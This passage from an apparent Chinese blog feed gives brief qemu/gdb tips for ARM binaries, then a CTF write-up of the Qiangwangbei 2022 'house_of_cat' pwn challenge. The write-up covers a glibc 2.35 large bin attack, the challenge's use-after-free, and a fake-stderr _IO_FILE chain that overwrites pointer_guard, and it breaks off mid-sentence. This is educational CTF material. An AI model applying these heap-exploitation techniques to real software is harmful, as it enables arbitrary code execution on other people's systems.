href="https://blog.csdn.net/qq_38154820/article/details/125875703?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166613948816782427428087%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=166613948816782427428087&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-125875703-null-null.142%5Ev59%5Epc_rank_34_1,201%5Ev3%5Econtrol_1&utm_term=arm%20pwn&spm=1018.2226.3001.4187">资料</a>中的做法如下：</p><p>虽然说在x86-64的机器上无法直接运行ARM架构的elf文件，但我们可以通过qemu来实现。虽然可以使用docker在x86-64的机器上创建一个ARM架构的docker容器，但太过麻烦，在容器中还需要安装很多东西。因此可以直接使用qemu与gdb-multiarch配合。</p><p>实际上qemu不仅可以用来起一个qemu容器，还可以仅仅运行一个其他架构的elf文件，可以添加选项<code>-g &lt;端口号&gt;</code>将elf程序映射到某一个端口，而且还会等待接入，只有当我们使用gdb-multiarch接入时才会开始准备执行其中的第一条指令，非常方便我们下断点。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gdb-multiarch</span><br><span class="line">sudo apt install qemu-user-static</span><br></pre></td></tr></table></figure><p>如果要执行的文件名为.&#x2F;pwn，则使用qemu执行该ARM可执行文件的命令为：<br><code>qemu-arm-static -g 9999 -L . ./pwn</code><br>之后启动gdb-multiarch：<br><code>gdb-multiarch ./pwn</code><br>连接端口：<br><code>pwndbg&gt; target remote 9999</code><br>即可开始调试。<br>如果想直接执行不调试，只需要删除qemu-arm-static中的-g选项即可。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>强网杯2022 pwn 赛题解析——house_of_cat</title>
      <link href="/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94house-of-cat/"/>
      <url>/2023/02/28/%E5%BC%BA%E7%BD%91%E6%9D%AF2022-pwn-%E8%B5%9B%E9%A2%98%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94house-of-cat/</url>
      
        <content type="html"><![CDATA[<p>这道题在pwn方向是做出来的队伍最多的一道题，但由于笔者之前对于高版本glibc的_IO_FILE攻击方式不甚了解，因此比赛的时候跳过了。本文就对该题进行从原理到实战的详细分析，帮助读者理解本题使用过的攻击方式。</p><h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house_of_cat"></a>house_of_cat</h1><p>本题使用的glibc版本是2.35，是目前ubuntu 22.04上最新的glibc版本。因此本题的调试与做题环境为：Ubuntu 22.04。</p><p>本题的漏洞利用方式为house of apple，这是一种基于large bin attack的_IO_FILE攻击方式。那么首先我们就需要了解large bin attack和_IO_FILE利用这两个基础知识。</p><h2 id="前置知识1——高版本libc的large-bin-attack"><a href="#前置知识1——高版本libc的large-bin-attack" class="headerlink" title="前置知识1——高版本libc的large bin attack"></a>前置知识1——高版本libc的large bin attack</h2><p>large bin attack从2.23版本到2.35版本，一直是一种没有被解决的利用方式，在高版本的libc中，large bin attack的具体方式与低版本区别并不大，利用原理也是相同的。不过与2.23和2.27版本不同，2.30及以上版本在_int_malloc函数中对于large bin新增了两个检查：（截图来自<a href="https://blog.csdn.net/qq_54218833/article/details/124239224">这里</a>）</p><p><img src="https://img-blog.csdnimg.cn/f306185344b9466dbef35195e70157d7.png"><br>下面我们通过how2heap简单看一下2.35版本的large bin attack是如何实现的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">Since glibc2.30, two new checks have been enforced on large bin chunk insertion</span><br><span class="line"></span><br><span class="line">Check 1 : </span><br><span class="line">&gt;    if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">&gt;        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">Check 2 : </span><br><span class="line">&gt;    if (bck-&gt;fd != fwd)</span><br><span class="line">&gt;        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br><span class="line"></span><br><span class="line">This prevents the traditional large bin attack</span><br><span class="line">However, there is still one possible path to trigger large bin attack. The PoC is shown below : </span><br><span class="line"></span><br><span class="line">====================================================================</span><br><span class="line"></span><br><span class="line">Here is the target we want to overwrite (0x7ffc96dca630) : 0</span><br><span class="line"></span><br><span class="line">First, we allocate a large chunk [p1] (0x564fd9bdc290)</span><br><span class="line">And another chunk to prevent consolidate</span><br><span class="line"></span><br><span class="line">We also allocate a second large chunk [p2]  (0x564fd9bdc6e0).</span><br><span class="line">This chunk should be smaller than [p1] and belong to the same large bin.</span><br><span class="line">Once again, allocate a guard chunk to prevent consolidate</span><br><span class="line"></span><br><span class="line">Free the larger of the two --&gt; [p1] (0x564fd9bdc290)</span><br><span class="line">Allocate a chunk larger than [p1] to insert [p1] into large bin</span><br><span class="line"></span><br><span class="line">Free the smaller of the two --&gt; [p2] (0x564fd9bdc6e0)</span><br><span class="line">At this point, we have one chunk in large bin [p1] (0x564fd9bdc290),</span><br><span class="line">               and one chunk in unsorted bin [p2] (0x564fd9bdc6e0)</span><br><span class="line"></span><br><span class="line">Now modify the p1-&gt;bk_nextsize to [target-0x20] (0x7ffc96dca610)</span><br><span class="line"></span><br><span class="line">Finally, allocate another chunk larger than [p2] (0x564fd9bdc6e0) to place [p2] (0x564fd9bdc6e0) into large bin</span><br><span class="line">Since glibc does not check chunk-&gt;bk_nextsize if the new inserted chunk is smaller than smallest,</span><br><span class="line">  the modified p1-&gt;bk_nextsize does not trigger any error</span><br><span class="line">Upon inserting [p2] (0x564fd9bdc6e0) into largebin, [p1](0x564fd9bdc290)-&gt;bk_nextsize-&gt;fd-&gt;nexsize is overwritten to address of [p2] (0x564fd9bdc6e0)</span><br><span class="line"></span><br><span class="line">In out case here, target is now overwritten to address of [p2] (0x564fd9bdc6e0), [target] (0x564fd9bdc6e0)</span><br><span class="line">Target (0x7ffc96dca630) : 0x564fd9bdc6e0</span><br><span class="line"></span><br><span class="line">====================================================================</span><br></pre></td></tr></table></figure><p>以上就是程序的输出结果。可以看到其利用的方式非常简单，前提条件是：</p><ol><li>large bin中有1个chunk，unsorted bin中有一个chunk（如果被链入到large bin中需要与前面的chunk链到一个bin中），且large bin中的比unsorted bin中的大。</li><li>可以修改large bin中chunk的bk_nextsize指针。</li></ol><p>当我们分配一个大chunk使得unsorted bin中的chunk被链入到large bin时，由于原先的large bin chunk比这个chunk大，所以居于其后（对large bin链入过程不清楚的读者可以先看<a href="https://blog.csdn.net/qq_54218833/article/details/123588647">这里</a>），这就绕过了添加的两个检查，能够成功将原large bin chunk中的bk_nextsize-&gt;fd_nextsize修改为新链入的chunk地址，即实现了<strong>任一地址写一个堆地址</strong>。</p><h2 id="前置知识2——-IO-FILE"><a href="#前置知识2——-IO-FILE" class="headerlink" title="前置知识2——_IO_FILE"></a>前置知识2——_IO_FILE</h2><p>在之前的<a href="https://blog.csdn.net/qq_54218833/article/details/122897689">文章</a>中分析过，这里就不费笔墨了。在<a href="https://blog.csdn.net/pythonxxoo/article/details/125342417?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165942247416780366567102%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165942247416780366567102&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-125342417-null-null.142%5Ev38%5Econtrol&utm_term=house%20of%20apple&spm=1018.2226.3001.4187">这篇文章</a>中也有简要的介绍。</p><hr><p>既然large bin attack可以实现任意地址写，如果我们将_IO_list_all的值修改为一个堆地址，那我们岂不是可以控制_IO_FILE结构体的执行流了吗？现在，我们就回到这道题本身来进行分析。</p><h2 id="Step-1-逆向分析"><a href="#Step-1-逆向分析" class="headerlink" title="Step 1: 逆向分析"></a>Step 1: 逆向分析</h2><p><img src="https://img-blog.csdnimg.cn/b663e0a308e9423ebb92d74dc8e39a08.png"><br>这道题的漏洞很好找，就在delete_cat这个函数中，删除操作中的free并未清空指针，因此有UAF漏洞。不过在能够操作菜单之前，我们还需要进行登录操作。这一部分的分析不难，按照函数的执行流程进行分析调试就能够获取到成功登录的字符串输入格式。最终通过login函数成功登录的字符串为：<code>LOGIN | r00t QWB QWXFadmin\x00</code></p><p><img src="https://img-blog.csdnimg.cn/ceb58e3f98f5496eaa2d0e2d7b4f6f8f.png"><br>在进入菜单之后，我们还需要通过某些检查。这些检查也不难通过，输入字符串为：<code>CAT | r00t QWB QWXF\xFF$</code></p><p><img src="https://img-blog.csdnimg.cn/1ee4d91fb8d34627967693775a2f97d4.png"><br>重点就在于菜单的四种操作。添加是正常的添加操作，只不过每一次添加的chunk可写部分大小必须在0x418到0x470之间，这是属于large bin的范围，因此本题和tcache无关。</p><p><img src="https://img-blog.csdnimg.cn/60ac2427148f4cf0a6aa505e7ddf309e.png"><br>然后是编辑功能，每一次只能编辑chunk可写部分的前30个字节而不能控制所有字节。</p><p><img src="https://img-blog.csdnimg.cn/08ef631678f44b3296a38ff369b60c3a.png"><br>show与edit相同，也是只能展示前30字节。</p><p><img src="https://img-blog.csdnimg.cn/5fd1b455eee649ac995605c84a0df23a.png"><br>由于本题中的delete函数有UAF漏洞，因此我们只要show一个free chunk就能够轻松获取到libc和堆地址。因此进行一次large bin attack并不是什么难事。但关键在于，我们应该如何构造假的_IO_FILE结构体。注意，本题中使用了沙箱，我们不能直接调用system函数getshell，因此还需要借用setcontext函数。</p><h2 id="Step-2-漏洞分析"><a href="#Step-2-漏洞分析" class="headerlink" title="Step 2: 漏洞分析"></a>Step 2: 漏洞分析</h2><p>本文主要参考Nu1L师傅的wp进行分析。其使用了<code>__malloc_assert</code>函数作为跳板进行漏洞利用。首先我们需要知道这个函数在何处被调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// malloc.c line 292</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __assert_fail(assertion, file, <span class="keyword">line</span>, function)\</span></span><br><span class="line"><span class="meta"> __malloc_assert(assertion, file, <span class="keyword">line</span>, function)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *__progname;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line"> <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     file, line,</span><br><span class="line">     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在malloc.c中我们可以找到，这里的<code>__assert_fail</code>就是<code>__malloc_assert</code>，即在这里调用<code>assert_fail</code>就相当于调用<code>__malloc_assert</code>。而<code>__assert_fail</code>是在<code>assert</code>函数中被调用，因此只需要找到在<code>malloc</code>函数中何处调用了<code>assert</code>函数即可。但<code>assert</code>函数调用的地方实在太多，我们应该选择哪一个呢？注意在<code>_int_malloc</code>函数中，所有针对堆的检查错误信息打印都是使用<code>malloc_printerr</code>函数而非<code>assert</code>。因此我们选择<code>_int_malloc</code>函数调用的<code>sysmalloc</code>函数。在<code>sysmalloc</code>函数中有检查是使用<code>assert</code>来实现的，而在<code>_int_malloc</code>函数中只有当完全确认释放的chunk无法满足申请需求且top chunk的大小也小于申请大小时才会调用<code>sysmalloc</code>函数。我们首先分析一下进入<code>sysmalloc</code>函数之后应该如何做才能拿到flag，至于如何调用<code>sysmalloc</code>函数，则是堆块排布方面的事情了，我们在后面也会提到。</p><p>在<code>sysmalloc</code>函数中，有这样一条<code>assert</code>语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// malloc.c line 2617</span></span><br><span class="line">  assert ((old_top == initial_top (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">          ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">           prev_inuse (old_top) &amp;&amp;</span><br><span class="line">           ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>这是用来检查<code>top chunk</code>的一些属性，其中注意最后一行，<code>top chunk</code>必须页对齐。如果这里的<code>top chunk</code>没有满足页对齐，那么就会调用<code>__assert_fail</code>函数，也即<code>__malloc_assert</code>函数。而在<code>__malloc_assert</code>函数中，经过调试发现，漏洞利用是发生在调用<code>__fxprintf</code>中而非<code>fflush</code>函数。这是因为当我们执行到<code>assert</code>失败时，<code>_IO_FILE</code>应该已经被我们修改，而<code>__fxprintf</code>作为一个需要将字符串输出到控制台的函数，必然会调出<code>stderr</code>文件描述符进行输出。但这个时候只有我们自己伪造的<code>_IO_FILE</code>指针，只要我们构造好假的<code>stderr</code>，就有可能实现任意代码执行。</p><p>笔者仔细研究了一下本题的利用思路，发现这是典型的house of emma利用方法。（<a href="https://blog.csdn.net/weixin_46483787/article/details/122808870?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165951020116780357291390%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165951020116780357291390&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-122808870-null-null.142%5Ev39%5Econtrol&utm_term=house%20of%20emma&spm=1018.2226.3001.4187">资料参考</a>）</p><p>经过笔者多次调试跟踪，最终发现程序在<code>__vfprintf_internal+0x280</code>处调用了<code>vtable+0x38</code>处的函数，其第一个参数<code>rdi</code>指向的是伪造的<code>stderr</code>：</p><p><img src="https://img-blog.csdnimg.cn/6ede1d6c5e0944558285b927adb0753a.png"><br>查看vtable类型的源码声明：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到，这里本意实际是想要调用结构体中偏移为0x38的成员，即<code>_IO_xsputn_t</code>函数。<br>又找到<code>_IO_cookie_jumps</code>结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_cookie_jumps</span> <span class="title">libio_vtable</span> =</span> &#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_file_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_file_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_default_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_file_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_cookie_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_file_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_file_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_cookie_read),</span><br><span class="line">  JUMP_INIT(write, _IO_cookie_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_cookie_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_cookie_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue),</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中注意到有一个<code>_IO_cookie_read</code>函数，我们查看一下这个函数在IDA中的汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000007F7B0 ; __unwind &#123;</span><br><span class="line">.text:000000000007F7B0                 endbr64</span><br><span class="line">.text:000000000007F7B4                 mov     rax, [rdi+0E8h]</span><br><span class="line">.text:000000000007F7BB                 ror     rax, 11h</span><br><span class="line">.text:000000000007F7BF                 xor     rax, fs:30h</span><br><span class="line">.text:000000000007F7C8                 test    rax, rax</span><br><span class="line">.text:000000000007F7CB                 jz      short loc_7F7D6</span><br><span class="line">.text:000000000007F7CD                 mov     rdi, [rdi+0E0h]</span><br><span class="line">.text:000000000007F7D4                 jmp     rax</span><br><span class="line">.text:000000000007F7D6 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000007F7D6</span><br><span class="line">.text:000000000007F7D6 loc_7F7D6:                              ; CODE XREF: sub_7F7B0+1B↑j</span><br><span class="line">.text:000000000007F7D6                 mov     rax, 0FFFFFFFFFFFFFFFFh</span><br><span class="line">.text:000000000007F7DD                 retn</span><br></pre></td></tr></table></figure><p>注意到这里有一个<code>jmp rax</code>，实际上就是<code>jmp [rdi+0E8h]</code>。而这里的<code>rdi</code>就是伪造的<code>stderr</code>，因此我们只需要在假<code>stderr</code>后面的特定位置写入<code>_IO_cookie_jumps+0x38</code>就可以保证执行到<code>_IO_cookie_read</code>函数，然后在假<code>stderr+0xE8</code>的位置写入正确的值就能够使得<code>jmp rax</code>跳转到我们想要的地方去。不过在此之前我我们可以看到<code>_IO_cookie_read</code>函数对<code>rax</code>的值做了一些修改，即上述代码中的<code>ror</code>指令和<code>xor</code>指令。这实际上是高版本glibc新增加的一种保护措施：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">_IO_cookie_read (FILE *fp, <span class="type">void</span> *buf, <span class="type">ssize_t</span> size)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_cookie_file</span> *<span class="title">cfile</span> =</span> (<span class="keyword">struct</span> _IO_cookie_file *) fp;</span><br><span class="line">  <span class="type">cookie_read_function_t</span> *read_cb = cfile-&gt;__io_functions.read;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">  PTR_DEMANGLE (read_cb);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (read_cb == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read_cb (cfile-&gt;__cookie, buf, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里的<code>PTR_DEMANGLE</code>函数，就是<code>ror/xor</code>指令的实现，其实质是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> PTR_DEMANGLE(var)asm (<span class="string">&quot;ror $2*&quot;</span> LP_SIZE <span class="string">&quot;+1, %0\n&quot;</span>      \</span></span><br><span class="line"><span class="meta">     <span class="string">&quot;xor %%fs:%c2, %0&quot;</span>      \</span></span><br><span class="line"><span class="meta">     : <span class="string">&quot;=r&quot;</span> (var)      \</span></span><br><span class="line"><span class="meta">     : <span class="string">&quot;0&quot;</span> (var),      \</span></span><br><span class="line"><span class="meta">       <span class="string">&quot;i&quot;</span> (offsetof (tcbhead_t,      \</span></span><br><span class="line"><span class="meta">      pointer_guard)))</span></span><br></pre></td></tr></table></figure><p>注意：在<code>/sysdeps/unix/sysv/linux/x86_64/sysdep.h</code>文件中有4个关于<code>PTR_DEMANGLE</code>函数的声明，但通过查看源码可知最有可能采用的就是上面的这个宏定义。通过源码可知第一条语句<code>ror</code>循环右移的位数为11，而第二条语句<code>xor rax, fs:30h</code>中的<code>fs:30h</code>应该指的就是<code>tcbhead_t.pointer_guard</code>这个东西。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> unused_vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The lowest address of shadow stack,  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((aligned (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure><p>这是<code>tcbhead_t</code>的声明，可以看到除了<code>pointer_guard</code>之外，这里面还定义有<code>stack_guard</code>，合理猜测这应该是用于<code>canary</code>。经过验证发现确实如此，函数开头的<code>mov rax, fs:28h</code>取的就是<code>stack_guard</code>的值。因此这里的<code>fs:30h</code>也就是<code>pointer_guard</code>的值。我们并不能读取原来的<code>pointer_guard</code>，但我们能通过<code>large bin attack</code>将这里的值修改为一个已知的值，这样我们就可以自行对想要执行的地址进行处理，经过<code>_IO_cookie_read</code>函数右移处理后变成正确的代码地址。那么<code>tcbhead_t</code>这个结构体在什么地方呢？实际上这个结构体并不在libc中，而是在紧邻libc低地址处的一块内存空间中（见下图），其与libc起始地址的偏移为<code>-0x28c0</code>。但这个值是在wp中的exp出现的，如果是我们自己做题，又应该如何获得这个值呢？前面提到<code>pointer_guard</code>与<code>stack_guard</code>相邻。我们在程序调试的时候可以将断点下在函数开头获取<code>stack_guard</code>的地方——<code>mov rax, fs:0x28</code>，获得<code>stack_guard</code>的值后再对内存空间进行搜索，这样就可以轻松找到<code>tcbhead_t</code>结构体了。</p><p><img src="https://img-blog.csdnimg.cn/9858f91249f84fe2bb4c638c4525de05.png"><br>在本题中，我们可以通过large bin 